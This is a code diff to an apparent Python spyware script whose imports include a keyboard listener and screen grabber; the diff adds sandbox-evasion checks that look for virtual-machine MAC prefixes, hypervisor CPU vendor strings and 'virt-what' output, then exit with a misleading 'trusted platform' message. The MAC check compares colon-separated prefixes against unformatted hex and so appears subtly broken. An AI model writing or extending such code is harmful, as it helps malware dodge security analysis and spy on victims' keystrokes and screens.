@@ -2,12 +2,17 @@
 # IMPORTS
 ########################################
 import os
+import sys
+import uuid
+import psutil
+import cpuinfo
 import ctypes
 import threading
 import pathlib
 import socketserver
 import http.server
 import requests
+import subprocess
 
 import time
 import socket
@@ -21,6 +26,46 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 from pynput.keyboard import Key, Listener
+########################################
+# vm
+########################################
+
+def check_mac_address():
+    mac_address = uuid.getnode()
+    virtual_macs = ['00:0C:29', '00:50:56', '00:05:69', '00:1C:14', '00:1C:42', '00:0F:4B', '00:03:FF', '00:15:5D', '00:16:3E', '08:00:27']
+    if any(hex(mac_address)[2:].startswith(mac) for mac in virtual_macs):
+        return True
+    return False
+
+def check_vendor_string():
+    info = cpuinfo.get_cpu_info()
+    if 'vendor_id' not in info:
+        return False
+    vendor_string = info['vendor_id'].lower()
+    virtual_env_names = ['kvm', 'virtualbox', 'vmware', 'hyperv', 'parallels', 'xen', 'qemu']
+    for env_name in virtual_env_names:
+        if env_name in vendor_string:
+            return True
+    return False
+
+def check_virtualization():
+    try:
+        output = subprocess.check_output(['virt-what']).decode().strip()
+        if output:
+            return True
+        else:
+            return False
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        return False
+
+def check_trusted_platform():
+    return not check_mac_address() and not check_vendor_string() and not check_virtualization()
+
+if not check_trusted_platform():
+    print("This script must be run on a trusted platform.")
+    sys.exit(1)
+else:
+    pass
 
 ########################################
 # config
